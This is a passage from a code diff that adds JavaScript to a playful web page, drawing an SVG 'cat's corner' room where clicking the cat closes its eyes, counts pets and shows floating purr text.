+    else if(g==='M'){to(Math.random()<(1+z)/2?[0,0,1]:[0,0,-1])}}});
+  draw();
+};
+
+/* ---- The cat's corner ---- */
+ROOMS.cat=function(){
+  var svg=$('bsbs');
+  svg.innerHTML='<path d="M420 40h160v190H420z" fill="#0d0f1a"/><path d="M500 40v190M420 135h160" stroke="#3b2a1c" stroke-width="6"/><rect x="420" y="40" width="160" height="190" fill="none" stroke="#3b2a1c" stroke-width="8"/><path d="M548 80a20 20 0 1 0 18 30 16 16 0 1 1-18-30z" fill="#ece3cf"/>'+
+   '<ellipse cx="300" cy="352" rx="300" ry="26" fill="#00000033"/><ellipse cx="260" cy="338" rx="150" ry="30" fill="#7a2f2a"/><path d="M120 336h280" stroke="#c99a2e" stroke-width="3" stroke-dasharray="6 6"/>'+
+   '<g id="bigcat" transform="translate(78 -876) scale(1.9)"><path class="tail" d="M70 638c-30 4-36-18-22-30" stroke="#0b0b10" stroke-width="7" fill="none" stroke-linecap="round"/><path d="M70 640c-6-30 0-60 26-70 26 8 32 40 26 70z" fill="#0b0b10"/><circle cx="96" cy="560" r="19" fill="#0b0b10"/><path d="M82 548l1-20 12 12zM98 540l12-12 1 20z" fill="#0b0b10"/>'+
+   '<g id="eyes"><ellipse class="eye" cx="89" cy="558" rx="3.6" ry="3.2" fill="#f3d02b"/><ellipse class="eye" cx="103" cy="558" rx="3.6" ry="3.2" fill="#f3d02b"/></g><path id="shut" d="M85 558q4 3 8 0M99 558q4 3 8 0" stroke="#f3d02b" stroke-width="1.6" fill="none" opacity="0"/></g>'+
+   '<ellipse cx="500" cy="352" rx="40" ry="12" fill="#d9a441"/><path d="M462 346h76" stroke="#a87a2c" stroke-width="3"/><text x="500" y="358" text-anchor="middle" font-family="Marcellus SC,serif" font-size="12" letter-spacing="2" fill="#3a2f22">BSBS</text>';
+  var n=0, wrap=svg.parentNode, t=null;
+  function pet(e){n++;$('pets').textContent='pets: '+n;$('eyes').setAttribute('opacity','0');$('shut').setAttribute('opacity','1');clearTimeout(t);t=setTimeout(function(){$('eyes').setAttribute('opacity','1');$('shut').setAttribute('opacity','0')},1400);
+    if(reduce)return; var r=svg.getBoundingClientRect(),w=wrap.getBoundingClientRect(),s=document.createElement('span');s.className='purr';s.textContent=['prrr','prrrr','♡','mrrp'][n%4];
+    s.style.left=((e&&e.clientX?e.clientX-w.left:r.width/2)-10)+'px';s.style.top=((e&&e.clientY?e.clientY-w.top:r.height/3)-20)+'px';wrap.appendChild(s);setTimeout(function(){s.remove()},1800)}
+  svg.addEventListener('click',pet); svg.addEventListener('keydown',function(e){if(e.key==='Enter'||e.key===' '){e.preventDefault();pet()}});
+};
+
+/* first load: honour a #room link */
+route();
+})();
+</script>
 
 </html>
